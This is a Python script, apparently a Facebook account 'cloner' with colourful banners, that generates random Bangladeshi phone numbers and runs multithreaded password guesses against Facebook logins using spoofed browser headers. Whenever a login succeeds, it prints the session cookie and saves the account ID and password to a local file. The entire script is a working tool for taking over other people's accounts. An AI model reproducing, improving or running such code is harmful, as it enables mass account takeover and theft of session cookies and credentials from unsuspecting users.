...
████████  █████  ███    ██ ██    ██ ██ ██████  
   ...
   ██    ██   ██ ██  ██ ██  ██  ██  ██ ██   ██ 
   ██    ██   ██ ██   ████   ████   ██ ██   ██
        \033[0;101m🔥TANVIR AHHAMED IS FIRE🔥\033[0m
\033[33;1m╔═══════\033[34;1m══════════\x1b[38;5;196m════════\033[34;1m══════\033[38;5;46m════╗
\x1b[38;5;196m║[√]\033[38;5;46mNAMR\033[33;1m         ║[√]\033[38;5;46mTANVIR AHHAMED\033[38;5;44m ║
\x1b[38;5;196m║[√]\033[38;5;46mTOOLS\033[33;1m        ║[√]\x1b[38;5;196mRANDOM\033[38;5;46m         ║
\x1b[38;5;196m║[√]\033[38;5;46mVERSION\033[33;1m      ║[√]\033[33;1m0.8\033[38;5;43m            ║
\x1b[38;5;196m║[√]\033[38;5;46mSATAUS\033[33;1m       ║[√]\033[33;1mFRRE\033[38;5;46m           ║
\033[33;1m╚═══════\033[34;1m══════════\x1b[38;5;196m════════\033[34;1m══════\033[38;5;46m════╝""")
...
def Main():
	...
	print("[\033[1;37m02\33[1;92m]CONTECT INFO")
	print("[\033[1;37m03\33[1;92m]FOLLOW MY FB PROFILE")
	print("[\033[1;35m04\033[1;35m]JOIN MY TALIGRAM ")
	...
	if opt in ["A","1"]:
		fuck()
	if opt in ["B","2"]:
		os.system('xdg-open https://www.facebook.com/dhdhiy?mibextid=ZbWKwL');time.sleep(1)
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/bhaghi.bangla?mibextid=2JQ9oc');time.sleep(1)
		fb()
	if opt in ["0","0"]:
		exit()
...
def fuck():
	...
	os.system('clear')
	print(logo)
	print(" [✔️] BD SIM CODE 017 015 018 019 013 015 016]")
	kode = input(' [👉] SELECT : ')
	os.system('clear')
	print(logo)
	doamin = ' BD Number id cloner [ONLY-OK] '
	print(' \033[1;35m[✔️] EXAMPLE : 1000,5000,10000,15000,20000] ')
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print('[✔️] COUNTRY    : Bangladesh')
		print('[✔️] TOTAL ID   :  '+tl)
		print(f'[✔️] SIM CODE   : \033[1;92m {kode} ')
		print('[✔️] START \033[1;35mRANDOM CLONING... ')
		print(50*'━')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','@@#','@@123','@#@#@#','Banglades,''123@@@','@@@###','₹₹@@12']
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[1;90m[\033[1;93mCRACKING\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
           ...
           'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5752.212", "Google Chrome";v="116.0.5752.212"',
           'sec-ch-ua-mobile': '?0',
           'sec-ch-ua-model': '"WIKO T50"',
           ...
           'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [TANVIR-😱] '+cid+' | '+ps+'\33[0;92m')
              #  print(f'\r\33[1;92m'+uid)
                print(f'\r\033[38;5;46m[🌺]\033[38;5;46mCOOKIE \033[1;35m: '+coki)
               # os.system('espeak a 300" ROCKY, ok,id"')
                #oks.append(cid)
                open('/sdcard/TANVIRok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
